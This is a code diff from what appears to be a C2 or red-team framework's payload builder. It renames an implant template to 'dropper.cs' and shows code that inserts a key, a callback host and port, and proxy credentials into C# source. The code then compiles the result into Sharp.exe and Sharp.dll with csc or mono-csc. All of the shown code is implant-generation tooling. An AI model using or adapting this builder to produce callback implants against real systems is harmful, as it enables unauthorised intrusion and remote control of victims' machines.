@@ -171,7 +171,7 @@ class Payloads(object):
 
   def CreateDlls(self, name=""):
     # Create Sharp DLL
-    with open("%sImplant-Core.cs" % FilesDirectory, 'rb') as f:
+    with open("%sdropper.cs" % FilesDirectory, 'rb') as f:
       content = f.read()
     cs = content.replace("#REPLACEKEY#",self.Key )
     cs1 = cs.replace("#REPLACEBASEURL#",(self.HostnameIP+":"+self.Serverport))
@@ -184,16 +184,16 @@ class Payloads(object):
     cs8 = cs7.replace("#REPLACEPROXYUSER#",self.Proxyuser)
     cs9 = cs8.replace("#REPLACEPROXYPASSWORD#",self.Proxypass)
     
-    self.QuickstartLog( "C# Payload written to: %s%sImplant-Core.cs" % (self.BaseDirectory,name) )
-    filename = "%s%sImplant-Core.cs" % (self.BaseDirectory,name)
+    self.QuickstartLog( "C# Payload written to: %s%sdropper.cs" % (self.BaseDirectory,name) )
+    filename = "%s%sdropper.cs" % (self.BaseDirectory,name)
     output_file = open(filename, 'w')
     output_file.write(cs9)
     output_file.close()
     if os.name == 'nt':
-        compile = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe %s%sImplant-Core.cs -o %s%sSharp.exe" % (self.BaseDirectory, name, self.BaseDirectory, name)
+        compile = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe %s%sdropper.cs -o %s%sSharp.exe" % (self.BaseDirectory, name, self.BaseDirectory, name)
     else:
-        compile = "mono-csc %s%sImplant-Core.cs -out:%s%sSharp.dll -target:library -warn:2" % (self.BaseDirectory,name,self.BaseDirectory,name)
-        compileexe = "mono-csc %s%sImplant-Core.cs -out:%s%sSharp.exe -target:exe -warn:2" % (self.BaseDirectory,name,self.BaseDirectory,name)
+        compile = "mono-csc %s%sdropper.cs -out:%s%sSharp.dll -target:library -warn:2" % (self.BaseDirectory,name,self.BaseDirectory,name)
+        compileexe = "mono-csc %s%sdropper.cs -out:%s%sSharp.exe -target:exe -warn:2" % (self.BaseDirectory,name,self.BaseDirectory,name)
     subprocess.check_output(compile, shell=True)
     self.QuickstartLog( "C# DLL written to: %s%sSharp.dll" % (self.BaseDirectory,name) )
     subprocess.check_output(compileexe, shell=True)
